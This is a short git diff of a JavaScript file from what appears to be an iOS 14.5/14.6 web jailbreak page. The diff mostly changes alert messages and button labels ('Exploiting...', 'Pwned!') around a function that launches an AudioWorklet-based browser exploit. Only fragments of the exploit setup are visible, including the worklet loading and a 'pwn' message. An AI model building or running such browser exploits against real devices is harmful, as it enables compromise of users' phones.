@@ -22,6 +22,8 @@ async function pwnMe() {
         document.getElementById("jbButton").innerHTML = "Jailbreaking...";
         alert("AudioWorklet exploit for iOS 14.5 has been executed!");
   		} else if (currentFirmware(navigator.userAgent).startsWith("14.6")) {
+        //document.getElementById("jbButton").innerHTML = "Jailbreaking...";
+        alert("AudioWorklet exploit for iOS 14.6 has been executed!");
         kickstart146();
 			} else {
 				document.getElementById("jbButton").innerHTML = "Unsupported: iOS " + currentFirmware(navigator.userAgent);
@@ -36,7 +38,7 @@ async function pwnMe() {
 
 var keep = [];
 function kickstart146() {
-  document.getElementById("jbButton").innerHTML = "Executing...";
+  document.getElementById("jbButton").innerHTML = "Exploiting...";
   var context = new OfflineAudioContext(1, 128, 300000);
   context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
     // constant added to double JSValues
@@ -205,7 +207,8 @@ function kickstart146() {
     await (new Promise((res) => setTimeout(res, 100)));
     wa.port.postMessage("pwn");
   });
-  document.getElementById("jbButton").innerHTML = "obj @ " + addr.toString(16);
+  document.getElementById("jbButton").innerHTML = "Pwned!";
+  alert("Pwned!");
 }
 
 const appHeight = () => {
